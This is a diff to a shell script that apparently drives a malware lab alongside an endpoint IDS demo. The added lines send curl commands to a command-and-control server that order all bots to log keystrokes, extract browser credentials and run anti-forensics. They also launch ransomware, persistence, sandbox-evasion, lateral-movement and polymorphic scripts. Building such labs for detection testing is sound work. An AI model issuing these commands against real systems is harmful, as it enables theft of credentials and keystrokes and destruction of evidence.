@@ -665,6 +665,64 @@ case "$PHASE" in
         echo '[Lab] Testing endpoint IDS...'
         python3 ids_engine_endpoint.py --demo
 
+        echo "[Lab] System profiling..."
+        curl -s -X POST http://192.168.100.10:5000/task \
+            -H "Content-Type: application/json" \
+            -H "X-Auth-Token: aw" \
+            -d '{"bot_id":"all","type":"system_profile","duration":10}'
+        sleep 15
+
+        echo "[Lab] Keylogger start → capture 20s → retrieve → stop..."
+        curl -s -X POST http://192.168.100.10:5000/task \
+            -H "Content-Type: application/json" \
+            -H "X-Auth-Token: aw" \
+            -d '{"bot_id":"all","type":"start_keylogger"}'
+        sleep 20
+        curl -s -X POST http://192.168.100.10:5000/task \
+            -H "Content-Type: application/json" \
+            -H "X-Auth-Token: aw" \
+            -d '{"bot_id":"all","type":"get_keylogs"}'
+        sleep 5
+        curl -s -X POST http://192.168.100.10:5000/task \
+            -H "Content-Type: application/json" \
+            -H "X-Auth-Token: aw" \
+            -d '{"bot_id":"all","type":"stop_keylogger"}'
+
+        echo "[Lab] Browser credential extraction..."
+        curl -s -X POST http://192.168.100.10:5000/task \
+            -H "Content-Type: application/json" \
+            -H "X-Auth-Token: aw" \
+            -d '{"bot_id":"all","type":"extract_creds"}'
+        sleep 10
+
+        echo "[Lab] Ransomware simulation (lab dir only)..."
+        python3 ransomware_sim.py --demo
+        sleep 5
+
+        echo "[Lab] Sandbox detection..."
+        python3 sandbox_evasion_sim.py --check --score
+
+        echo "[Lab] Persistence planting + IDS detection..."
+        python3 persistence_sim.py --plant --method cron
+        sleep 35
+        python3 persistence_sim.py --remove
+
+        echo "[Lab] Anti-forensics (lab artifacts only)..."
+        curl -s -X POST http://192.168.100.10:5000/task \
+            -H "Content-Type: application/json" \
+            -H "X-Auth-Token: aw" \
+            -d '{"bot_id":"all","type":"anti_forensics"}'
+        sleep 10
+
+        echo "[Lab] Lateral movement chain..."
+        python3 lateral_movement_sim.py --detect
+
+        echo "[Lab] Polymorphic execution variants..."
+        python3 polymorphic_engine.py --variants 4 --profile
+
+        echo "[Lab] Endpoint IDS Engine 22 full demo..."
+        python3 ids_engine_endpoint.py --demo
+
         echo ""
         echo -e "${GRN}╔══════════════════════════════════════════════════════╗${NC}"
         echo -e "${GRN}║   FULL LAB COMPLETE                                  ║${NC}"
